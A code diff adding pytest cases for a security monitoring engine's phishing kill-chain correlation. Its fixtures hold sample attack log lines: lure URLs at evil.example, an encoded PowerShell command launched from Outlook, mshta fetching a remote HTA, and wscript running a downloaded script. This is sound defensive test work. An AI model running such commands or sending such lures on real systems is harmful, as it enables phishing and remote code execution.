@@ -382,3 +382,124 @@ async def test_ransomware_extension_rule_requires_an_actual_ransomware_suffix():
     assert normal_database_write == []
     assert len(encrypted_file_write) == 1
     assert encrypted_file_write[0]["type"] == "Ransomware file extension detected"
+
+
+@pytest.mark.asyncio
+async def test_phishing_correlation_requires_ordered_delivery_and_suspicious_execution():
+    redis = FakeRedis()
+    engine = CorrelationEngine(redis, config=SIEM_RULES)
+
+    delivery = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="alice",
+        event_id="EMAIL-LURE",
+        event_type="email_message",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "event_uid": "delivery-1",
+            "event_type": "email_message",
+            "message": "Verify your account at https://evil.example/login",
+        },
+    )
+    benign_shell = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="alice",
+        event_id="4688",
+        event_type="process_create",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "event_uid": "process-benign",
+            "event_type": "process_create",
+            "message": "powershell.exe Get-Process",
+            "processed_data": {"parent_process_name": r"C:\Windows\explorer.exe"},
+        },
+    )
+    suspicious_shell = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="alice",
+        event_id="4688",
+        event_type="process_create",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "event_uid": "process-suspicious",
+            "event_type": "process_create",
+            "message": "powershell.exe -EncodedCommand SQBFAFgA",
+            "processed_data": {"parent_process_name": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"},
+        },
+    )
+
+    assert delivery is None
+    assert benign_shell is None
+    assert suspicious_shell is not None
+    assert suspicious_shell["type"] == "Correlated phishing kill-chain detected"
+    assert suspicious_shell["summary"] == "Phishing delivery followed by suspicious execution for alice"
+    assert suspicious_shell["agent_id"] == "AGENT-1"
+
+
+@pytest.mark.asyncio
+async def test_phishing_correlation_rejects_machine_accounts_and_cross_agent_joining():
+    redis = FakeRedis()
+    engine = CorrelationEngine(redis, config=SIEM_RULES)
+
+    machine_delivery = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="DESKTOP-ABC$",
+        event_id="EMAIL-LURE",
+        event_type="email_message",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "message": "Verify your account at https://evil.example/login",
+        },
+    )
+    assert machine_delivery is None
+    assert redis.values == {}
+
+    await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="alice",
+        event_id="EMAIL-LURE",
+        event_type="email_message",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "message": "Invoice attached at https://evil.example/invoice.hta",
+        },
+    )
+    cross_agent_execution = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.6",
+        user="alice",
+        event_id="4688",
+        event_type="process_create",
+        log_entry={
+            "agent_id": "AGENT-2",
+            "message": "mshta.exe https://evil.example/invoice.hta",
+        },
+    )
+
+    assert cross_agent_execution is None
+
+
+@pytest.mark.asyncio
+async def test_phishing_execution_before_delivery_does_not_complete_a_chain():
+    redis = FakeRedis()
+    engine = CorrelationEngine(redis, config=SIEM_RULES)
+
+    execution = await engine.check_phishing_kill_chain(
+        tenant_id="TENANT-PHISH",
+        source_ip="10.0.0.5",
+        user="alice",
+        event_id="4688",
+        event_type="process_create",
+        log_entry={
+            "agent_id": "AGENT-1",
+            "message": "wscript.exe C:\\Users\\alice\\Downloads\\invoice.js",
+        },
+    )
+
+    assert execution is None
+    assert not any(key.startswith("warsoc:dyn:alerted:phishing:") for key in redis.values)
